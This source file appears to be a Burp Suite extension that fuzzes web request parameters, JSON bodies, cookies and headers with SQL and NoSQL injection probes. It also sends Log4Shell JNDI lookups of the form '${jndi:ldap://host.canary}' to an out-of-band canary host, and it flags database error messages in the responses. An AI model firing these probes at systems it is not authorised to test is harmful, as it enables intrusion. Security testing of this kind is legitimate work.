import copy
import json
import urllib

pool = RequestPool(5)
canary = getOOBCanary()
print(canary)

ERROR_PATTERNS = {"unknown operator", "MongoError", "cannot be applied to a field", "expression is invalid", "SQL syntax", "java.sql.", "Syntax error", "Error SQL:", "SQL Execution", "\xe9\x99\x84\xe8\xbf\x91\xe6\x9c\x89\xe8\xaf\xad\xe6\xb3\x95\xe9\x94\x99\xe8\xaf\xaf", "SQLException", "\xe5\xbc\x95\xe5\x8f\xb7\xe4\xb8\x8d\xe5\xae\x8c\xe6\x95\xb4", " ORA-0", " ORA-1", "com.alibaba.fastjson","### SQL:"}
INFO_PATTERNS = {"83b3j45b"}
SKIP_HEADERS = {'content-length', 'host', 'transfer-encoding', 'cache-control', 'user-agent', 'pragma', 'priority', 'connection', 'cookie', 'content-type', 'upgrade-insecure-requests'}

def finish():
    pool.shutdown()

def fuzz_value(req, resp):
    fuzz_params(req, resp, payload="'\")", urlencode=True, concat=True, fuzz_cookie=True, fuzz_header=True)

def fuzz_key(req, resp):
    fuzz_params(req, resp, payload="'()", urlencode=False, concat=True, fuzz_cookie=True, fuzz_key_only=True)

def nosql(req, resp):
    fuzz_params(req, resp, payload={"$83b3j45b":"83b3j45b"}, urlencode=False, fuzz_cookie=True)
    fuzz_params(req, resp, payload="[$83b3j45b]", urlencode=False, fuzz_cookie=True, fuzz_key_only=True)

def fuzz_all(req, resp):
    fuzz_value(req, resp)
    fuzz_key(req, resp)
    nosql(req, resp)

def fuzz_log4j(req):
    host = req.httpService().host()
    fuzz_params(req, None, payload="${jndi:ldap://" + host + '.' + canary + "}", urlencode=True, concat=False, fuzz_cookie=True, fuzz_header=True)

def handleInteraction(interaction):
    t = interaction.type()
    oob_id = interaction.id().toString()
    clientIp = interaction.clientIp()
    clientPort = interaction.clientPort()
    print(clientIp, clientPort, t, oob_id)

    dnsDetails = interaction.dnsDetails()
    httpDetails = interaction.httpDetails()
    if dnsDetails.isPresent():
        print(dnsDetails.get().query().toString())
    if httpDetails.isPresent():
        print(httpDetails.get().requestResponse().request())

def registerContextMenu(menus):
    menus.register("fuzz nosql", nosql, MenuType.REQUEST_RESPONSE)
    menus.register("fuzz param key", fuzz_key, MenuType.REQUEST_RESPONSE)
    menus.register("fuzz param value", fuzz_value, MenuType.REQUEST_RESPONSE)
    menus.register("fuzz all", fuzz_all, MenuType.REQUEST_RESPONSE)
    menus.register("fuzz log4j", fuzz_log4j, MenuType.REQUEST)


@run_in_pool(pool)
def compare_req(request, origin_resp):
    req_resp = sendRequest(request)
    # print(origin_resp.statusCode(), req_resp.response().statusCode())
    # print(origin_resp.body().length(), req_resp.response().body().length())
    if req_resp.response() is None:
        return
    body = req_resp.response().bodyToString()
    for highlight in INFO_PATTERNS:
        if highlight in body:
            addIssue(auditIssue("Spring Bean", "String detail", "String remediation", req_resp.request().url(),
                                AuditIssueSeverity.INFORMATION, AuditIssueConfidence.CERTAIN, "String background",
                                "String remediationBackground", AuditIssueSeverity.MEDIUM, req_resp.withResponseMarkers(getResponseHighlights(req_resp, highlight))))
            break
    for highlight in ERROR_PATTERNS:
        if highlight in body:
            addIssue(auditIssue("Found Injection", "String detail", "String remediation", req_resp.request().url(),
                                AuditIssueSeverity.HIGH, AuditIssueConfidence.CERTAIN, "String background",
                                "String remediationBackground", AuditIssueSeverity.MEDIUM, req_resp.withResponseMarkers(getResponseHighlights(req_resp, highlight))))
            break


def iter_and_modify_json(node, payload, concat=True, fuzz_key_only=False):
    result = []
    if isinstance(node, dict):
        for key, value in node.items():
            if fuzz_key_only:
                new_node1 = copy.copy(node)
                new_node1[key + payload] = new_node1[key]
                del new_node1[key]
                result.append(new_node1)
                continue
            modified_subnode = iter_and_modify_json(value, payload, concat, fuzz_key_only)
            for sub_result in modified_subnode:
                new_node = copy.copy(node)
                new_node[key] = sub_result
                result.append(new_node)
    elif isinstance(node, list):
        for i in range(len(node)):
            if isinstance(node[i],(dict, list)):
                modified_subnode = iter_and_modify_json(node[i], payload, concat, fuzz_key_only)
                for sub_result in modified_subnode:
                    new_node = copy.copy(node)
                    new_node[i] = sub_result
                    result.append(new_node)
            else:
                new_node = copy.copy(node)
                new_node[i] = str(node[i]) + payload if concat else payload
                result.append(new_node)
            break # test first parm in list
    elif isinstance(node, (str, unicode)):
        if len(node.strip()) > 2 and node.strip()[0] in ['{', '[']: # json string in query-string's value
            try:
                json_node= json.loads(node)
                for modified_node in iter_and_modify_json(json_node, payload, concat, fuzz_key_only):
                    result.append(json.dumps(modified_node,separators=(':',',')))
            except Exception as e:
                print(e)
        result.append(node + payload if concat else payload)
    else:
        result.append(str(node) + payload if concat else payload)
    return result


def fuzz_headers(request, origin_response, payload="'", concat=True):
    for header in request.headers():
        if header.name().lower().startswith("sec-") or header.name().lower().startswith("accept") or header.name().lower().startswith("if-"):
            continue
        if header.name().lower() in SKIP_HEADERS:
            continue
        compare_req(request.withUpdatedHeader(header.name(), header.value() + payload if concat else payload), origin_response)


def fuzz_json(request, origin_response, payload="'", concat=True, fuzz_key_only=False):
    try:
        json_obj = json.loads(request.bodyToString().encode("utf-8"))
        for i in iter_and_modify_json(json_obj, payload, concat if isinstance(payload, (str, unicode)) else False, fuzz_key_only):
            compare_req(request.withBody(json.dumps(i)), origin_response)
    except Exception as e:
        print(e)


def fuzz_params(request, origin_response, payload="'", urlencode=False, concat=True, fuzz_cookie=False, fuzz_header=False, fuzz_key_only=False):

    def process_parameter(param):
        key, value, ptype = param.name(), param.value().strip(), param.type()
        decode_value = urllib.unquote(value)
        if len(decode_value) > 2 and decode_value[0] in ['{', '[']:  # param's value is json
            try:
                json_obj = json.loads(decode_value)
                for i in iter_and_modify_json(json_obj, payload, concat if isinstance(payload, (str, unicode)) else False, fuzz_key_only):
                    compare_req(request.withUpdatedParameters(parameter(key, urllib.quote(json.dumps(i,separators=(',',':'))) if urlencode else json.dumps(i,separators=(',',':')), ptype)), origin_response)
            except Exception as e:
                print(e)
        if isinstance(payload, (str, unicode)):
            if fuzz_key_only:
                compare_req(request.withRemovedParameters(param).withParameter(parameter(urllib.quote(key + payload) if urlencode else key + payload, param.value(),  ptype)), origin_response)
                return
            pv = urllib.unquote(param.value()) if urlencode else param.value()
            v = pv + payload if concat else payload
            compare_req(request.withUpdatedParameters(parameter(key, urllib.quote(v) if urlencode else v, ptype)), origin_response)

    # fuzz json
    if request.contentType() == ContentType.JSON:
        fuzz_json(request, origin_response, payload, concat, fuzz_key_only)

    # fuzz other parameter except json
    for param in request.parameters():
        if param.type() == HttpParameterType.COOKIE and not fuzz_cookie:
            continue
        if param.type() in [HttpParameterType.BODY, HttpParameterType.URL, HttpParameterType.COOKIE]:
            process_parameter(param)

    # fuzz header
    if fuzz_header:
        fuzz_headers(request, origin_response, payload, concat)

